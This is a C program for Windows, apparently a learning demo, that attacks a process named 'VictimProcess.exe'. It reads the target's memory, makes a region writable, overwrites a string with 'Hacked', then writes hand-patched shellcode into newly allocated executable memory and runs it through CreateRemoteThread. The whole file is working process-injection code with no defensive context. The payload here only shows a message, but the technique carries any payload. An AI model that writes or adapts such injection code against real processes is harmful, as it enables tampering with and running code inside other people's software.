#include <stdio.h>
#include <Windows.h>
#include "Utils.h"


VOID readWriteMemory(HANDLE hProcess, DWORD dwBaseAddress)
{
    DWORD pText = dwBaseAddress + 0x20f8;
    DWORD pCaption = dwBaseAddress + 0x2100;
    CHAR  buffer[100];
    DWORD dwProtect = PAGE_READWRITE;

    ReadProcessMemory(hProcess, (void*)pText, &buffer, sizeof(CHAR) * 100, NULL);
    printf("Text: %s\n", buffer);
    ReadProcessMemory(hProcess, (void*)pCaption, &buffer, sizeof(CHAR) * 100, NULL);
    printf("Caption: %s\n", buffer);

    if (VirtualProtectEx(hProcess, (LPVOID)(dwBaseAddress + 0x2000), 0x1000, dwProtect, &dwProtect) != NULL)
    {
        if (WriteProcessMemory(hProcess, (LPVOID)pText, (LPCVOID)"Hacked", 7, NULL) == NULL)
        {
            DWORD errCode = GetLastError();
            printf("WriteProcessMemory error: %08x\n", errCode);
        }
        VirtualProtectEx(hProcess, (LPVOID)(dwBaseAddress + 0x3000), 0x1000, dwProtect, &dwProtect);
    }
    else
    {
        DWORD errCode = GetLastError();
        printf("VirtualProtectEx error: %08x\n", errCode);
    }

    ReadProcessMemory(hProcess, (void*)pText, &buffer, sizeof(CHAR) * 100, NULL);
    printf("New text: %s\n", buffer);
    ReadProcessMemory(hProcess, (void*)pCaption, &buffer, sizeof(CHAR) * 100, NULL);
    printf("New caption: %s\n", buffer);
}

VOID injectShellcode(HANDLE hProcess, DWORD dwBaseAddress)
{
    BYTE shellcode[0x100] = "\x31\xC0\x68\xCC\xCC\xCC\xCC\x68\xBB\xBB\xBB\xBB\xBB\xAA\xAA\xAA\xAA\xFF\xD3\x83\xC4\x10\xC3\x49\x6e\x6a\x65\x63\x74\x65\x64";
    DWORD pShellcode = (DWORD)VirtualAllocEx(hProcess, NULL, 0x22, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    DWORD pNewText = pShellcode + 0x17;
    DWORD pCaption = dwBaseAddress + 0x2100;
    DWORD pFunc = dwBaseAddress + 0x1000;

    memcpy(shellcode + 0x03, &pCaption, 4);
    memcpy(shellcode + 0x08, &pNewText, 4);
    memcpy(shellcode + 0x0D, &pFunc, 4);
    WriteProcessMemory(hProcess, (LPVOID)pShellcode, shellcode, 0x100, 0);
    CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pShellcode, NULL, NULL, NULL);
}

INT main()
{
    const CHAR* processName = "VictimProcess.exe";
    DWORD dwProcessId;
    DWORD dwBaseAddress;
    HANDLE hProcess;

    if ((dwProcessId = getProcessIdByName(processName)) != NULL)
    {
        if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId)) != NULL)
        {
            if ((dwBaseAddress = getModuleBase(processName, dwProcessId)) != NULL)
            {
                readWriteMemory(hProcess, dwBaseAddress);
                injectShellcode(hProcess, dwBaseAddress);
            }
            else
            {
                printf("Module not found\n", processName);
            }
        }
        else
        {
            printf("OpenProcess error\n");
        }
    }
    else
    {
        printf("Process doesn't exist\n");
    }
    ExitProcess(0);
}